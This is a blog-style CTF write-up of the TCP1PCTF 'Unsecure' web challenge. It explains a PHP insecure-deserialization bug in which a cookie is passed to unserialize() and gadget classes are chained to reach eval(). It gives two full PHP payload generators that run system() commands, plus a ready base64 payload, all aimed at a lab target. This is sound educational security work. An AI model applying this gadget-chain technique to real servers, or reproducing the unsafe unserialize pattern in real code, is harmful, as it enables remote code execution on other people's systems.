---
title: "[TCP1PCTF2024] Unsecure"
date: "12 June 2024"
cover:
author: "Vicevirus"
origsrc: "https://vicevirus.github.io/posts/unsecure-tcp1pctf-2023/"
category: "WEB"
tags:
  - WEB
  - TCP1PCTF
  - 2023
---

This challenge was solved by one of our team member **H0j3n.** I only managed to solve half of it due to time constraints and stuck on chaining the gadgets.

In this challenge, we were given a source code zipped in a file called `dist.zip`

**Unzipped we will have the following files:**

![Untitled](/images/ctfs/tcp1pctf2023-unsecure/Untitled.png)

**Well, what is it? What kind of web is this?**

---

This seems like a simple PHP website with composer package manager installed. With bunch of PHP folders with the name `Gadgets`

**Let’s take a look at index.php first**

---

```php
<?php
require("vendor/autoload.php");

if (isset($_COOKIE['cookie'])) {
    $cookie = base64_decode($_COOKIE['cookie']);
    unserialize($cookie);
}

echo "Welcome to my web app!";
```

**Breakdown of what the code does:**

1. **`require("vendor/autoload.php");`**:
    - This line includes the PHP file **`vendor/autoload.php`** using the **`require`** statement. This typically suggests that the code is using Composer, a PHP package manager, and it's likely loading dependencies or classes defined in the **`vendor`** directory.
2. **`if (isset($_COOKIE['cookie']))`**:
    - This conditional statement checks whether a cookie named **`'cookie'`** is set in the user's browser.
3. Cookie Decoding:
    - If the **`'cookie'`** cookie is set, the code proceeds to decode its value using **`base64_decode`**. The decoded value is stored in the **`$cookie`** variable.
4. Unserialization:
    - The code then attempts to unserialize the value of the **`$cookie`** variable using the **`unserialize()`** function. This function is used to restore an object or data structure from its serialized (string) representation.
    - When **`unserialize()`** is used with untrusted data, an attacker can craft malicious serialized data that contains PHP code. When this data is deserialized, the PHP code within it can be executed on the server, leading to remote code execution. This can allow attackers to take control of the server or perform malicious actions.

Ohoo now we know that **`unserialize()`** is  vulnerable to **insecure deserialization attack…**

![https://media3.giphy.com/media/8fen5LSZcHQ5O/giphy.gif?cid=7941fdc67dc8qcix5mk94s5f2t3s52y427rf9hh99vrxih1e&ep=v1_gifs_search&rid=giphy.gif&ct=g](https://media3.giphy.com/media/8fen5LSZcHQ5O/giphy.gif?cid=7941fdc67dc8qcix5mk94s5f2t3s52y427rf9hh99vrxih1e&ep=v1_gifs_search&rid=giphy.gif&ct=g)

But wait.. remember all the `Gadgets` files that we’ve seen in the picture before this? It might be useful.

Let’s take a look at them `(GadgetOne,GadgetTwo, GadgetThree)`

**GadgetOne (Adders.php)**

---

```php
<?php

namespace GadgetOne {
    class Adders
    {
        private $x;
        function __construct($x)
        {
            $this->x = $x;
        }
        function get_x()
        {
            return $this->x;
        }
    }
}
```

This PHP code defines a class named **`Adders`** within the **`GadgetOne`** namespace, which has a private property **`$x`** and methods to set and retrieve its value.

**GadgetTwo (Echoers.php)**

---

```php
<?php

namespace GadgetTwo {
    class Echoers
    {
        protected $klass;
        function __destruct()
        {
            echo $this->klass->get_x();
        }
    }
}
```

This PHP code defines a class **`Echoers`** within the **`GadgetTwo`** namespace, and when an instance of this class is destroyed, it attempts to echo the value returned by the **`get_x()`** method of an object stored in its protected **`$klass`** property, assuming that such an object is present.

**GadgetThree (Vuln.php)**

---

```php
<?php

namespace GadgetThree {
    class Vuln
    {
        public $waf1;
        protected $waf2;
        private $waf3;
        public $cmd;
        function __toString()
        {
            if (!($this->waf1 === 1)) {
                die("not x");
            }
            if (!($this->waf2 === "\xde\xad\xbe\xef")) {
                die("not y");
            }
            if (!($this->waf3) === false) {
                die("not z");
            }
            eval($this->cmd);
        }
    }
}
```

This PHP code defines a class **`Vuln`** within the **`GadgetThree`** namespace, with public, protected, and private properties, and when the **`__toString()`** method is called, it checks some conditions and executes the code provided in the **`cmd`** property if those conditions are met, potentially allowing for arbitrary code execution.

**Interesting `eval()` function here (RCE probably)** 👀

---

## So.. what do we do now with all this stuff that we have found?

---

Well, I am guessing that we have to  `chain` all these `Gadgets` , serialize it using **`serialize()`** and pass it to the **`unserialize()`** function inside the website in order to get the flag through `**RCE (Remote Code Execution)`**

**To make it simple:**

1. **GadgetOne(Adders.php)** stores value.
2. **GadgetTwo(Echoers.php)** echo the value given to it after the object is destroyed.
3. **GadgetThree(Vuln.php)** runs code execution **`eval()`**

**The flow of how it should be chained and how the payload can be generated:**

1. Initialize **GadgetThree(Vuln.php),** match all the checks, pass in `system()` command to achieve RCE.
2. Initialize **GadgetOne(Adders.php)** and pass the previously initialized **GadgetThree** to **GadgetOne**. **GadgetOne** will now store our **GadgetThree** object.
3. The last part is to, initialize **GadgetTwo(Echoers.php)** and pass the previously initialized **GadgetOne. GadgetTwo** will now echo the things that we’ve stored in **GadgetOne** just now.
4. Serialize them. **(GadgetTwo)**
5. Pass it to the `cookie` on the website in base64 encoded form.
6. Profit ?????

**GadgetThree(Vuln.php) → GadgetOne(Adders.php) → GadgetTwo(Echoers.php)**

---

## So, how can we craft our own deserialization payload?

To craft our own `deserialization` payload, we need a PHP testbed to **make it work and run it first**. In the final step, we will serialize the working code using **`serialize()`** function.

### But wait.. **there’s a problem.**

As we can see in the `Gadgets` code previously, the code uses `protected` and `private` variables, which doesn’t allow direct tampering of variables from outside. By default, this prohibits us from passing in data and match all the checks inside the `Gadgets`

![https://media0.giphy.com/media/7bskJX6iodRno5mufQ/giphy.gif?cid=7941fdc6k8jy92ray65lzt82oa95a3pout46c8vcd3np0jpj&ep=v1_gifs_search&rid=giphy.gif&ct=g](https://media0.giphy.com/media/7bskJX6iodRno5mufQ/giphy.gif?cid=7941fdc6k8jy92ray65lzt82oa95a3pout46c8vcd3np0jpj&ep=v1_gifs_search&rid=giphy.gif&ct=g)

---

### ReflectionClass to the rescue!

In PHP, the **`ReflectionClass`** class is part of the Reflection API, which allows you to inspect and manipulate information about classes and their properties, methods, and other class-related details at runtime. Specifically, **`ReflectionClass`** is used to obtain information about a particular class. (It’s useful for dirty debugging I guess)

**Reference:**

[PHP: ReflectionClass - Manual](https://www.php.net/manual/en/class.reflectionclass.php)

With `**ReflectionClass**`, we could manipulate the `protected` and `private` variables during runtime to make the code work/run as it should.

Now, we could easily match all the checks and pass in data to the `Gadgets` that we have just now.

![Yay! // Pls dont be traumatised by this picture](https://media1.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif?cid=7941fdc6z27eahiipohy8gcgw3092x6btqk27b8yrt0mmpfs&ep=v1_gifs_search&rid=giphy.gif&ct=g)

Yay! // Pls dont be traumatised by this picture

**Author note:** Tbh, I thought the payload generated from this  **`ReflectionClass`** method would only work locally. But after reading **H0j3n’s** brief writeup and understanding a ‘little bit’ about PHP deserialization, it actually works on the same environment (locally or remotely) if it were to be serialized.

# Solution

---

## Approach 1 (Credit to H0j3n)

```php
<?php
require("vendor/autoload.php");

$gadgetOne = new \GadgetOne\Adders(1);
$gadgetTwo = new \GadgetTwo\Echoers();
$gadgetThree = new \GadgetThree\Vuln();

// Setup GadgeThree == Setup Vuln with RCE
// __toString() == Need to trigger this with echo (Can only be found in Echoers.php)
// get an Vuln class instance
$vuln = new \GadgetThree\Vuln();
$reflection = new \ReflectionClass($gadgetThree);
$property = $reflection->getProperty('waf1');
$property->setAccessible(true);
$property->setValue($vuln, 1);
$property = $reflection->getProperty('waf2');
$property->setAccessible(true);
$property->setValue($vuln, "\xde\xad\xbe\xef");
$property = $reflection->getProperty('waf3');
$property->setAccessible(true);
$property->setValue($vuln, false);
$property = $reflection->getProperty('cmd');
$property->setAccessible(true);
$property->setValue($vuln, "system('cat *.txt');");

// Setup GadgetOne == set x = Vuln()
// __construct($x) == Can easily set x = Vuln()
// get a Adders class instance
$adders = new \GadgetOne\Adders(1);
$reflection = new \ReflectionClass($gadgetOne);
$property = $reflection->getProperty('x');
$property->setAccessible(true);
$property->setValue($adders, $vuln);

// Setup GadgetTwo
// __destruct() == Trigger if exception or exit
// We can try to set klass with GadgetOne value contains our RCE payload
// get Echoers class instance
$echoers = new \GadgetTwo\Echoers();
$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection->getProperty('klass');
$property->setAccessible(true);
$property->setValue($echoers, $adders);

$serialized = serialize($echoers);

echo base64_encode($serialized);

echo "\n";

?>
```

**Explanation from H0j3n:**

- `__construct()` in GadgetOne = Use this to set `$x` to `Vuln()` with RCE + bypass the `waf1,waf2,waf3`
- `__destruct()` in GadgetTwo = Inside here got echo which will be use to trigger `__toString()`. But to trigger `__destruct()`, from what I know we need to make it exit/exception which we can set the `$klass` with the object of GadgetOne itself.

**Useful functions in `ReflectionClass` that make this method work:**

**setAccessible() →** Make the property/variable accessible.

**setValue() →** Set the value for the property/variable.

**Running the code above, will generate the payload in base64-encoded form:**

```php
TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO086MTY6IkdhZGdldFRocmVlXFZ1bG4iOjQ6e3M6NDoid2FmMSI7aToxO3M6NzoiACoAd2FmMiI7czo0OiLerb7vIjtzOjIyOiIAR2FkZ2V0VGhyZWVcVnVsbgB3YWYzIjtiOjA7czozOiJjbWQiO3M6MjA6InN5c3RlbSgnY2F0ICoudHh0Jyk7Ijt9fX0=
```

---

## Approach 2 (credit to HeapCreate)

```php
<?php

namespace GadgetOne {
    class Adders {
        private $x;
        function __construct($x) {
            $this->x = $x;
        }
    }
}

namespace GadgetTwo {
    class Echoers {
        protected $klass;
    }
}

namespace GadgetThree {
    class Vuln {
        public $waf1 = 1;
        protected $waf2 = "\xde\xad\xbe\xef";
        private $waf3 = false;
        public $cmd = "system('id');";
    }
}

namespace {
    $GadgetThree = new GadgetThree\Vuln();
    $GadgetOne = new GadgetOne\Adders($GadgetThree);
    $GadgetTwo = new GadgetTwo\Echoers();
    $reflectionClass = new ReflectionClass($GadgetTwo);
    $reflectionProperty = $reflectionClass->getProperty("klass");
    $reflectionProperty->setAccessible(true);
    $reflectionProperty->setValue($GadgetTwo, $GadgetOne);

    $serialized = base64_encode(serialize($GadgetTwo));
    echo $serialized."\n";
}
```

This is another approach by our new member ****HeapCreate****. Works the same as above, but requires less usage of `ReflectionClass` and much more neater (imo).

## Final steps

---

Pass the generated payload to **`cookie`** and you will get the flag!

![Untitled](/images/ctfs/tcp1pctf2023-unsecure/Untitled%201.png)

**Flag:** `TCP1P{unserialize in php go brrrrrrrr ouch}`

**Thanks for reading my write-up and have a nice day!**